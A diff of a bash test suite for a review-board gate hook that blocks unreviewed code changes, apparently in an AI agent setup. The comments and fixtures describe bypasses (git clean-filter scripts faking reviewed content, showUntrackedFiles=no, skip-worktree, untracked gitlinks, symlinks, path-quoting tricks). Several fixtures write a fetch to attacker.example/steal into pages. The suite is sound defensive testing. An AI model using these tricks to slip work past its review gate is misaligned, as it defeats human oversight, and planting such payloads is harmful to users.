@@ -8,10 +8,30 @@
 # worktree's `.git`-as-file blocking permanently with no way to clear it; a
 # sign-off invalidating the hash it had just approved). Each was found by hand.
 #
-# Coverage is real but not total. There is no unborn-HEAD fixture, and no probe
-# for the self-invalidating sign-off (both sign-off fixtures leave the work
-# uncommitted, so mark_cleared writes the same HEAD and the re-record is a
-# no-op). Nothing runs this file automatically — it is not wired into any script.
+# Coverage is real but not total. There is no unborn-HEAD fixture, and no
+# probe exercises the self-invalidating sign-off (see review-board-signoff.sh
+# around `mark_cleared` / the re-record `cp`) as its own subject. This exact
+# sentence has been wrong twice already -- once claiming zero fixtures
+# advance the baseline at sign-off time when one did, then claiming that one
+# fixture was "partial, incidental coverage" when deleting the re-record
+# mechanism it was credited with pinning failed no probe at all, proving the
+# credit was false. Whether some existing fixture happens to advance the
+# baseline at sign-off time is NOT the same claim as whether any fixture
+# actually exercises the re-record path -- the first is a fact about this
+# file's current contents and will keep drifting as fixtures are added or
+# reordered; the second is the one that matters and the honest answer is no.
+# If you add a fixture that pins this, delete this whole paragraph rather
+# than editing it again.
+#
+# One more known gap: the waiver-side newline refusal in `waiver_forbidden_
+# paths` (work-hash.sh, mirroring the gate-side sentinel) has no probe of
+# its own -- both newline probes in this file drive `compute_work_hash`
+# directly. Confirmed NOT a fail-open (deleting just that arm still refuses,
+# via `compute_work_hash` running after `waiver_forbidden_paths` clears in
+# `review-board-signoff.sh`, just with a `Cannot sign off:` prefix instead
+# of `Cannot waive:`), so this is a coverage gap behind a probed guard, not
+# an unpinned one.
+# Nothing runs this file automatically — it is not wired into any script.
 #
 #   bash .claude/hooks/review-board-gate.test.sh
 set -uo pipefail
@@ -477,25 +497,27 @@ rm -rf "$d"
 
 # A symlink under src/ pointing into a WORK_DENY path: the blob is 40 bytes, the
 # surface behind it is unbounded and permanently unreviewable.
-# Two steps, because one proves nothing: an untracked symlink is new work and
-# the gate blocks on that alone, guard or no guard. What matters is whether the
-# link can be CLEARED and its target then rewritten unreviewed.
+#
+# Targets a real WORK_DENY path (ROADMAP.md / the state directory), not
+# docs/: docs/ left WORK_DENY once the bundler turned out to resolve imports
+# into it, which makes it ordinary reviewable work -- so a probe that points
+# there and falls back to "rewrite the target, expect a block" passes
+# whether or not the symlink guard exists at all, since the gate blocks on
+# the target's own unreviewed content either way. Confirmed by deleting the
+# guard's WORK_DENY arm outright: these two probes did not fail. A WORK_DENY
+# target has no such fallback -- outside the symlink guard, nothing else in
+# this gate refuses a link merely because of where it points -- so this
+# asserts the guard's message directly, with no else branch to pass through.
 for shape in dir file; do
   d=$(new_repo) || break
-  mkdir -p "$d/docs/demo"
-  printf '<h1>real</h1>\n' > "$d/docs/demo/+page.svelte"
-  if [ "$shape" = dir ]; then (cd "$d/src/routes" && ln -s ../../docs/demo symdemo)
-  else (cd "$d/src/routes" && ln -s ../../docs/demo/+page.svelte linked.svelte)
+  if [ "$shape" = dir ]; then (cd "$d/src/routes" && ln -s ../../.claude/.review-board-state symdemo)
+  else (cd "$d/src/routes" && ln -s ../../ROADMAP.md linked.svelte)
   fi
   out=$(signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
     --pass contract-auditor --pass a11y-ssr-auditor 2>&1)
-  if printf '%s' "$out" | grep -q "symlink under a rendered root"; then
-    ok "a $shape symlink from src/ into docs/ cannot be signed off"
-  else
-    # It signed off. Now rewrite the target and see whether the gate notices.
-    printf '<div role="dialog" aria-modal="true">rewritten</div>\n' > "$d/docs/demo/+page.svelte"
-    expect_block "$d" "a $shape symlink from src/ into docs/ cannot be signed off"
-  fi
+  printf '%s' "$out" | grep -q "symlink under a rendered root" &&
+    ok "a $shape symlink from src/ into a WORK_DENY path cannot be signed off" ||
+    no "a $shape symlink from src/ into a WORK_DENY path cannot be signed off" "signed off cleanly"
   rm -rf "$d"
 done
 
@@ -622,18 +644,18 @@ rm -rf "$d"
 
 # A root-level config symlink in a shape the scan missed: .cjs is the required
 # form for a PostCSS config in an ESM package and rewrites every byte of CSS.
+#
+# Targets ROADMAP.md, not docs/p.cjs: the same docs/-is-reviewable-work gap
+# as the src/ probes above meant this one asserted only that an untracked
+# link blocks at all -- true with the guard deleted, since docs/p.cjs is
+# itself unreviewed work either way. No else branch, for the same reason.
 d=$(new_repo) || exit 1
-mkdir -p "$d/docs"
-printf 'module.exports = {};\n' > "$d/docs/p.cjs"
-(cd "$d" && ln -s docs/p.cjs postcss.config.cjs)
+(cd "$d" && ln -s ROADMAP.md postcss.config.cjs)
 out=$(signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
   --pass contract-auditor --pass a11y-ssr-auditor 2>&1)
-if printf '%s' "$out" | grep -q "symlink under a rendered root"; then
-  ok "a root-level .cjs config symlink cannot be signed off"
-else
-  printf 'module.exports = { plugins: { evil: {} } };\n' > "$d/docs/p.cjs"
-  expect_block "$d" "a root-level .cjs config symlink cannot be signed off"
-fi
+printf '%s' "$out" | grep -q "symlink under a rendered root" &&
+  ok "a root-level .cjs config symlink cannot be signed off" ||
+  no "a root-level .cjs config symlink cannot be signed off" "signed off cleanly"
 rm -rf "$d"
 
 
@@ -1020,6 +1042,834 @@ out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh
 printf '%s' "$out" | grep -q "nests deeper" &&
   ok "a component below the walk's depth bound blocks" ||
   no "a component below the walk's depth bound blocks" "gate did not refuse on depth"
+rm -rf "$d"
+
+# The depth pre-check used to run on every ignored directory unconditionally,
+# with no is_artifact filter -- so an ORDINARY node_modules nested past depth
+# 13 bricked the gate with an unactionable "flatten it", even though
+# walk_hidden_dir prunes node_modules entirely and would never have descended
+# there. Real on this machine: both ../cinder's and ../agent-bureau's own
+# node_modules exceed this depth today. The probe just above proves a
+# genuinely deep NON-artifact directory still refuses; this proves an
+# artifact one does not.
+# expect_allow, not a bare `grep -q "nests deeper" &&  no || ok`: that
+# asserted only the ABSENCE of one string, which stays absent if the gate
+# crashes, hangs, or is replaced outright -- exactly the "a stubbed gate
+# reads as unproven" trap expect_allow/gate() exist to catch. Confirmed:
+# inserting `exit 0` right after the gate's flag parsing left the bare
+# version reporting ok while every other allow/block probe failed.
+# The `.gitignore` rule is committed and SIGNED OFF FIRST (it is itself
+# reviewable work -- adding an ignore rule hides source), then the deep
+# node_modules content is added on top with nothing else in the reviewable
+# diff changed. expect_allow needs a real clean state to assert against:
+# node_modules is an ARTIFACT_DIR, excluded from the hash entirely once
+# walk_hidden_dir prunes it, so nothing about its content should ever
+# require a fresh review -- confirming that is the whole point of this
+# probe, separate from "was this ever reviewed at all".
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'node_modules/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+deep="$d/node_modules/a/b/c/d/e/f/g/h/i/j/k/l/m"
+mkdir -p "$deep" && echo x > "$deep/file.txt"
+expect_allow "$d" "a deep node_modules does not brick the gate"
+rm -rf "$d"
+
+# An UNTRACKED gitlink (`cd src/lib/vendor && git init`, never `git add`-ed to
+# the superproject) produced no 160000 entry in the REAL index, so the dirty-
+# submodule guard -- keyed on `git ls-files -s`, which only sees tracked
+# gitlinks -- never fired for it. Meanwhile the hash's own throwaway index
+# (built with `git add -A -N`) DID materialize it, and a gitlink's diff
+# saturates at "-dirty" the moment it is, so a signed-off component behind an
+# untracked embedded repo could be rewritten afterward with nothing to catch
+# it. Two steps, matching the symlink probes above: sign off while clean,
+# then dirty it and confirm the gate notices.
+d=$(new_repo) || exit 1
+mkdir -p "$d/src/lib/vendor"
+(cd "$d/src/lib/vendor" && git init -q && printf '<h1>v1</h1>\n' > V.svelte && git add -A && git commit -qm v) >/dev/null 2>&1
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+printf '<div role="dialog" aria-modal="true">rewritten</div>\n' > "$d/src/lib/vendor/V.svelte"
+out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh </dev/null 2>&1)
+printf '%s' "$out" | grep -q "embedded repository" &&
+  ok "a rewrite behind an untracked gitlink is not silently cleared" ||
+  no "a rewrite behind an untracked gitlink is not silently cleared" "gate allowed"
+rm -rf "$d"
+
+# The same untracked-gitlink blind spot, on the WAIVER path: `git diff
+# --name-only` reports a changed gitlink as one opaque directory path
+# (`docs/vendor`, not `docs/vendor/Modal.svelte`), which matches no
+# WAIVER_NEVER pattern -- the exact collapse already fixed for git-ignored
+# directories, but that fix never reached gitlinks.
+d=$(new_repo) || exit 1
+mkdir -p "$d/docs/vendor"
+(cd "$d/docs/vendor" && git init -q \
+  && printf '<div role="dialog" aria-modal="true">no trap</div>\n' > Modal.svelte \
+  && git add -A && git commit -qm v) >/dev/null 2>&1
+out=$(signoff "$d" --waive --grounds formatting-only --reason "nothing here renders" 2>&1)
+printf '%s' "$out" | grep -q "Modal.svelte" &&
+  ok "an untracked gitlink's contents are not waivable" ||
+  no "an untracked gitlink's contents are not waivable" "waived cleanly: $out"
+rm -rf "$d"
+
+# WAIVER_NEVER compares byte-for-byte, and this repo's filesystem is
+# case-insensitive (`core.ignorecase=true`, APFS default) -- so
+# `assets/Theme.CSS` matched no pattern in the list while being, on disk,
+# exactly the file `.css` names. `src/` itself is not exploitable this way
+# (git normalizes a tracked `SRC/...` back to `src/...`), but the extension
+# arms outside `src/` had no such backstop.
+d=$(new_repo) || exit 1
+mkdir -p "$d/assets"
+printf 'body{color:red}\n' > "$d/assets/Theme.CSS"
+git -C "$d" add -A >/dev/null 2>&1
+out=$(signoff "$d" --waive --grounds formatting-only --reason r 2>&1)
+printf '%s' "$out" | grep -q "Theme.CSS" &&
+  ok "a mixed-case extension is not waivable" ||
+  no "a mixed-case extension is not waivable" "waived cleanly: $out"
+rm -rf "$d"
+
+# A single-file .gitignore rule naming a RENDERED file outside src/static
+# (`hidden.svelte`, not a directory) was invisible to the hash: the
+# directory-shaped enumeration above was expanded to catch is_source files,
+# but the single-file branch's `elif renders "$f"` arm had no probe at all,
+# and is exactly what SvelteKit still SSRs.
+d=$(new_repo) || exit 1
+printf 'hidden.svelte\n' >> "$d/.gitignore"
+printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/hidden.svelte"
+git -C "$d" add .gitignore >/dev/null 2>&1
+h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+printf '<div role="dialog" aria-modal="true">changed</div>\n' > "$d/hidden.svelte"
+h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+if [ -n "$h1" ] && [ "$h1" != "$h2" ]; then
+  ok "a rendered file hidden by a single-file ignore rule moves the hash"
+else
+  no "a rendered file hidden by a single-file ignore rule moves the hash" "hash unchanged ($h1 -> $h2)"
+fi
+rm -rf "$d"
+
+# A `filter.<name>.clean` command, wired to a path via .gitattributes,
+# transforms content before git computes ANY diff -- including inside the
+# throwaway index this reads. `--no-ext-diff --no-textconv` on the diff
+# below guards external diff drivers and textconv; neither touches
+# filter.*.clean, and there is no `--no-filters` to ask git diff for the
+# untransformed comparison. A clean command that reconstructs whatever was
+# last reviewed, regardless of the real bytes on disk, makes the diff (and
+# so the hash) report no change while the file is completely different.
+# Two steps, same shape as the symlink and gitlink probes above: sign off
+# on a real edit, THEN wire the filter and rewrite, so the probe proves a
+# REWRITE goes undetected rather than merely that a first edit is unreviewed.
+d=$(new_repo) || exit 1
+printf '<h1>v0</h1>\n' > "$d/src/routes/+page.svelte"
+git -C "$d" add -A >/dev/null 2>&1 && git -C "$d" commit -qm v0 >/dev/null 2>&1
+git -C "$d" rev-parse HEAD > "$d/.claude/.review-board-state/last-cleared"
+printf '<h1>v1 real reviewed content</h1>\n' > "$d/src/routes/+page.svelte"
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+nuke=$(mktemp) || exit 1
+{
+  printf '#!/bin/sh\n'
+  printf 'cat > /dev/null\n'
+  printf 'printf %s\n' "'<h1>v1 real reviewed content</h1>\n'"
+} > "$nuke"
+chmod +x "$nuke"
+git -C "$d" config "filter.nuke.clean" "$nuke"
+printf '*.svelte filter=nuke\n' >> "$d/.git/info/attributes"
+printf '<div role="dialog" aria-modal="true">rewritten, unreviewed</div>\n' > "$d/src/routes/+page.svelte"
+out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh </dev/null 2>&1)
+printf '%s' "$out" | grep -q "clean filter" &&
+  ok "a rewrite hidden behind a clean filter is not silently cleared" ||
+  no "a rewrite hidden behind a clean filter is not silently cleared" "gate allowed"
+rm -f "$nuke"
+rm -rf "$d"
+
+# waiver_forbidden_paths used to discard WALK_TRUNCATED_SENTINEL with
+# `grep -vxF` instead of refusing on it, silently proceeding with whatever
+# walk_hidden_dir enumerated up to the cap -- so a forbidden component
+# sorting past the cap could sit outside the truncated slice with nothing
+# raised. Externally-ignored (`.git/info/exclude`, not `.gitignore`) so
+# ignore_source_is_external forces __external=1 unconditionally and this
+# reaches the fixed enumerator regardless of file content -- an in-tree
+# rule instead only ever exercises compute_work_hash's OWN separate cap
+# check further down the same command, which would mask this gap entirely.
+d=$(new_repo) || exit 1
+mkdir -p "$d/lab"
+for i in $(seq 1 800); do echo x > "$d/lab/file_$i.txt"; done
+printf '<div role="dialog" aria-modal="true">forbidden</div>\n' > "$d/lab/zzz.svelte"
+printf 'lab/\n' >> "$d/.git/info/exclude"
+# Asserts "Cannot waive:" specifically, not just "hides more than": compute_
+# work_hash runs its OWN independent cap check right after, over the same
+# git-status-ignored directory regardless of __external classification, and
+# its "Cannot sign off: ... hides more than" message would match a looser
+# grep even with THIS fix reverted -- proving only the redundant downstream
+# catch, not this one. "Cannot waive:" only prints when waiver_forbidden_
+# paths itself sets WORK_ERROR, before compute_work_hash ever runs.
+out=$(signoff "$d" --waive --grounds formatting-only --reason "nothing renders" 2>&1)
+printf '%s' "$out" | grep -q "^Cannot waive:.*hides more than" &&
+  ok "a waiver over a truncated ignored directory refuses rather than under-counting" ||
+  no "a waiver over a truncated ignored directory refuses rather than under-counting" "did not refuse via waiver_forbidden_paths: $out"
+rm -rf "$d"
+
+# The clean-filter check first read from the REAL index (`git ls-files -z`),
+# so an UNTRACKED path carrying the attribute was invisible to it --
+# work in flight is usually untracked at sign-off time, which made this the
+# commoner shape, not the rarer one.
+d=$(new_repo) || exit 1
+nuke=$(mktemp) || exit 1
+{
+  printf '#!/bin/sh\n'
+  printf 'cat > /dev/null\n'
+  printf 'printf %s\n' "'<h1>never actually reviewed</h1>\n'"
+} > "$nuke"
+chmod +x "$nuke"
+git -C "$d" config "filter.nuke.clean" "$nuke"
+printf '*.svelte filter=nuke\n' >> "$d/.git/info/attributes"
+printf '<div role="dialog" aria-modal="true">never reviewed, all untracked</div>\n' > "$d/src/routes/+page.svelte"
+out=$(signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor 2>&1)
+printf '%s' "$out" | grep -q "clean filter" &&
+  ok "an untracked path with a clean filter is not silently signed off" ||
+  no "an untracked path with a clean filter is not silently signed off" "signed off: $out"
+rm -f "$nuke"
+rm -rf "$d"
+
+# `git check-attr --stdin -z filter | tr '\0' '\n'` desyncs the moment any
+# TRACKED path -- not necessarily the attacked one -- contains a literal
+# newline byte, which is a legal git path: the NUL boundaries stay intact in
+# `-z` output, but converting them to newlines turns the embedded byte into
+# an extra record boundary and misaligns every (path, attr, value) triple
+# after it. A decoy path elsewhere in the tree is enough to blind the check
+# to the real attack.
+# The decoy must SORT BEFORE the attacked path in `git ls-files -z` output
+# (`!` is byte 0x21, before `+` at 0x2B, so `!decoy` precedes `+page.svelte`)
+# -- corruption from a desynced triple only affects entries AFTER the point
+# where alignment is lost, so a decoy sorting after the target proves
+# nothing (confirmed: that shape stayed green even with the NUL-safety fix
+# fully reverted). And the decoy and target both need to be part of an
+# ALREADY-REVIEWED baseline, with only the malicious rewrite outstanding --
+# otherwise the gate blocks anyway because the decoy itself is new
+# unreviewed work, which looks like a pass without proving the filter
+# attack was actually caught.
+d=$(new_repo) || exit 1
+printf '<h1>v0</h1>\n' > "$d/src/routes/+page.svelte"
+decoy_dir="$d/src/routes/!decoy/$(printf 'x\ny')"
+mkdir -p "$decoy_dir"
+echo decoy > "$decoy_dir/d.txt"
+git -C "$d" add -A >/dev/null 2>&1 && git -C "$d" commit -qm v0 >/dev/null 2>&1
+printf '<h1>v1 real reviewed content</h1>\n' > "$d/src/routes/+page.svelte"
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+nuke=$(mktemp) || exit 1
+{
+  printf '#!/bin/sh\n'
+  printf 'cat > /dev/null\n'
+  printf 'printf %s\n' "'<h1>v1 real reviewed content</h1>\n'"
+} > "$nuke"
+chmod +x "$nuke"
+git -C "$d" config "filter.nuke.clean" "$nuke"
+printf '*.svelte filter=nuke\n' >> "$d/.git/info/attributes"
+printf '<div role="dialog" aria-modal="true">rewritten, unreviewed</div>\n' > "$d/src/routes/+page.svelte"
+out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh </dev/null 2>&1)
+printf '%s' "$out" | grep -q "clean filter" &&
+  ok "a newline-containing decoy path does not blind the clean-filter check" ||
+  no "a newline-containing decoy path does not blind the clean-filter check" "gate allowed: $out"
+rm -f "$nuke"
+rm -rf "$d"
+
+# The same `status.showUntrackedFiles=no` shape, on the LINKED WORKTREE
+# guard rather than the gitlink one -- set inside the worktree's own
+# per-worktree config (not the main checkout's), it makes THAT worktree's
+# `git status --porcelain` report clean while an entirely untracked,
+# unreviewed component sits right there.
+d=$(new_repo) || exit 1
+wt=$(mktemp -d) || exit 1
+rm -rf "$wt"
+git -C "$d" branch wtbranch >/dev/null 2>&1
+git -C "$d" worktree add "$wt" wtbranch -q >/dev/null 2>&1
+git -C "$wt" config status.showUntrackedFiles no
+printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$wt/Sneaky.svelte"
+expect_block "$d" "a linked worktree with showUntrackedFiles=no still blocks on new content"
+git -C "$d" worktree remove "$wt" --force >/dev/null 2>&1
+rm -rf "$wt"
+rm -rf "$d"
+
+# `status.showUntrackedFiles=no` set INSIDE an embedded repo's own config
+# (not this repo's -- nothing here would ever see the setting itself) makes
+# `git -C "$sm" status --porcelain` report clean while an entirely
+# untracked, unreviewed component sits right there. No `.gitignore` needed.
+d=$(new_repo) || exit 1
+mkdir -p "$d/src/lib/vendor"
+(cd "$d/src/lib/vendor" && git init -q && printf '<h1>v1</h1>\n' > V.svelte \
+  && git add -A && git commit -qm v && git config status.showUntrackedFiles no) >/dev/null 2>&1
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$d/src/lib/vendor/Sneaky.svelte"
+expect_block "$d" "an embedded repo with showUntrackedFiles=no still blocks on new content"
+rm -rf "$d"
+
+# An embedded repo's own COMMITTED .gitignore hides content from its status
+# entirely regardless of showUntrackedFiles -- a different mechanism from
+# the probe above, so both are needed. Piped through is_artifact on the
+# fix side, so this must NOT fire on the embedded repo's own node_modules
+# (the sanity half of this probe).
+d=$(new_repo) || exit 1
+mkdir -p "$d/src/lib/vendor"
+(cd "$d/src/lib/vendor" && git init -q && printf 'ui/\n' > .gitignore \
+  && echo r > README.txt && git add -A && git commit -qm v) >/dev/null 2>&1
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+mkdir -p "$d/src/lib/vendor/ui"
+printf '<div role="dialog" aria-modal="true">no trap</div>\n' > "$d/src/lib/vendor/ui/Modal.svelte"
+expect_block "$d" "a component hidden by an embedded repo's own .gitignore still blocks"
+rm -rf "$d"
+
+# Signed off with the gitlink and its node_modules already in place, THEN
+# more content is added inside node_modules (an ordinary `bun install`
+# shape) with nothing else in the reviewable diff changed -- same two-step
+# structure as the probe above it, needed for the same reason: a brand new,
+# never-reviewed gitlink always blocks regardless of what is inside it, so
+# expect_allow needs a real signed-off baseline to assert against first.
+d=$(new_repo) || exit 1
+mkdir -p "$d/src/lib/vendor/node_modules/somepkg"
+(cd "$d/src/lib/vendor" && git init -q && printf 'node_modules/\n' > .gitignore \
+  && echo r > README.txt && git add -A && git commit -qm v) >/dev/null 2>&1
+echo x > "$d/src/lib/vendor/node_modules/somepkg/index.js"
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+echo y > "$d/src/lib/vendor/node_modules/somepkg/more.js"
+expect_allow "$d" "an embedded repo's own node_modules does not brick the gate"
+rm -rf "$d"
+
+# Nothing in the suite pins the bash-3.2 parseability fix itself: every gate
+# invocation above runs via `bash`, which resolves to a modern interpreter
+# on this machine, so a reintroduced `case` inside `$( )` would leave every
+# OTHER probe green while silently breaking the hook for anyone whose `bash`
+# resolves to stock macOS 3.2. `bash -n` alone would not catch it either --
+# that only proves the file parses on WHATEVER bash ran the check.
+if [ -x /bin/bash ]; then
+  if /bin/bash -n "$HOOKS_SRC/work-hash.sh" 2>/dev/null &&
+     /bin/bash -n "$HOOKS_SRC/review-board-gate.sh" 2>/dev/null &&
+     /bin/bash -n "$HOOKS_SRC/review-board-signoff.sh" 2>/dev/null; then
+    ok "the hooks parse under /bin/bash (stock macOS 3.2)"
+  else
+    no "the hooks parse under /bin/bash (stock macOS 3.2)" "a syntax error under /bin/bash -n"
+  fi
+else
+  no "the hooks parse under /bin/bash (stock macOS 3.2)" "/bin/bash not found on this machine -- cannot verify"
+fi
+
+# `git add -A -N` into a FRESH, empty throwaway index has no notion of what
+# the real index already tracks, so a path matching `.gitignore` that was
+# force-tracked (`git add -f`) is skipped entirely -- not staged as new,
+# not staged as modified, simply absent, regardless of its content. Every
+# diff built from that index reported such a path as "does not exist" no
+# matter what it held: two commits force-adding completely DIFFERENT
+# content to the same ignored, tracked path produced the IDENTICAL empty
+# diff both times against baseline, a real hash collision rather than a
+# mere omission -- neither state ever moved the hash. `tmp/` matches this
+# repo's own unanchored ignore rule (same shape used elsewhere in this
+# file), so `git add -f` on a path under it reproduces the exact case.
+# `tmp/` must actually BE ignored before the force-add, or `git add -f` is a
+# no-op on an already-trackable path and the fixture never reaches the bug
+# at all -- `new_repo` sets up no default .gitignore, so this establishes
+# one first, matching the shape used elsewhere in this file.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/src/routes/tmp"
+printf '<h1>v1</h1>\n' > "$d/src/routes/tmp/+page.svelte"
+git -C "$d" add -f src/routes/tmp/+page.svelte >/dev/null 2>&1
+h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/routes/tmp/+page.svelte"
+git -C "$d" add -f src/routes/tmp/+page.svelte >/dev/null 2>&1
+h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
+  ok "a force-added ignored path does not hash-collide across different content"
+else
+  no "a force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
+fi
+rm -rf "$d"
+
+# The probe above alone was not enough: `add_ignored_tracked`'s `git
+# ls-files --cached --ignored --exclude-standard` came back plain (no `-z`,
+# no `-c core.quotePath=false`), so a non-ASCII force-tracked ignored path
+# is C-quoted on output and the subsequent `git add -f -N -- "$path"`
+# matches nothing -- reopening the identical collision, silently, for any
+# path outside ASCII. Same shape, one non-ASCII path segment.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/src/café/tmp"
+printf '<h1>v1</h1>\n' > "$d/src/café/tmp/+page.svelte"
+git -C "$d" add -f "src/café/tmp/+page.svelte" >/dev/null 2>&1
+h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/café/tmp/+page.svelte"
+git -C "$d" add -f "src/café/tmp/+page.svelte" >/dev/null 2>&1
+h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
+  ok "a non-ASCII force-added ignored path does not hash-collide across different content"
+else
+  no "a non-ASCII force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
+fi
+rm -rf "$d"
+
+# `-c core.quotePath=false` alone (no `-z`) only suppresses quoting for
+# non-ASCII bytes -- git still C-quotes a `"`, `\`, control byte, or
+# newline regardless of it. Three enumerations in this file used
+# quotePath=false without -z on a LINE-based `git status --porcelain
+# --ignored=matching` stream, so a quote character anywhere in the
+# collapsed ignored-directory path corrupted the `sed -n 's/^!! //p'`
+# extraction and the whole directory read as invisible -- a silent ALLOW
+# on an unreviewed component, not even a refusal. `qu"ote/` as the ignore
+# rule itself reproduces it: the collapsed line becomes `!! "src/routes/qu
+# \"ote/"`, quoted end to end.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'qu"ote/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/src/routes/qu\"ote"
+printf '<h1>v1</h1>\n' > "$d/src/routes/qu\"ote/+page.svelte"
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/routes/qu\"ote/+page.svelte"
+expect_block "$d" "a quote character in an ignored path does not blind the hidden-directory scan"
+rm -rf "$d"
+
+# `git add -f -N -- "$__tp"` in add_ignored_tracked parses pathspec magic
+# AFTER `--`, so a repo-relative path beginning with `:` (pathspec magic
+# syntax -- e.g. a directory literally named `:magic`) matches no pathspec
+# and is silently dropped, exit 128 into the swallowed `2>/dev/null` --
+# the identical collision the function exists to close, reopened a third
+# way (after non-ASCII and quote/control-byte).
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/:magic/tmp"
+printf '<h1>v1</h1>\n' > "$d/:magic/tmp/+page.svelte"
+git -C "$d" add -f -- './:magic/tmp/+page.svelte' >/dev/null 2>&1
+h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/:magic/tmp/+page.svelte"
+git -C "$d" add -f -- './:magic/tmp/+page.svelte' >/dev/null 2>&1
+h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
+  ok "a colon-prefixed force-added ignored path does not hash-collide across different content"
+else
+  no "a colon-prefixed force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
+fi
+rm -rf "$d"
+
+# Git's index is per-worktree and per-embedded-repo, so a
+# `skip-worktree`/`assume-unchanged` bit set INSIDE a linked worktree (or
+# an embedded gitlink) hides a modification from THAT repo's own status
+# and diff the identical way it does for the outer repo -- and the outer
+# repo's own index-bits check, at the top of compute_work_hash, only ever
+# reads the outer repo's own index.
+d=$(new_repo) || exit 1
+printf '<h1>v1</h1>\n' > "$d/src/routes/Modal.svelte"
+git -C "$d" add -A >/dev/null 2>&1 && git -C "$d" commit -qm v0 >/dev/null 2>&1
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+wt=$(mktemp -d) || exit 1
+rm -rf "$wt"
+git -C "$d" branch fix >/dev/null 2>&1
+git -C "$d" worktree add "$wt" fix -q >/dev/null 2>&1
+git -C "$wt" update-index --skip-worktree src/routes/Modal.svelte
+printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$wt/src/routes/Modal.svelte"
+expect_block "$d" "skip-worktree set inside a linked worktree still blocks"
+git -C "$d" worktree remove "$wt" --force >/dev/null 2>&1
+rm -rf "$wt"
+rm -rf "$d"
+
+# The gitlink twin of the probe above. Three independent review rounds
+# found this arm existed in the code but had no discriminating fixture --
+# deleting it failed no probe at all, even though it is exactly as
+# load-bearing as the worktree arm and defends the identical shape of
+# bypass one level deeper (an embedded repo, not a checked-out branch).
+d=$(new_repo) || exit 1
+mkdir -p "$d/src/lib/vendor"
+(cd "$d/src/lib/vendor" && git init -q && printf '<h1>v1</h1>\n' > Modal.svelte \
+  && git add -A && git commit -qm v) >/dev/null 2>&1
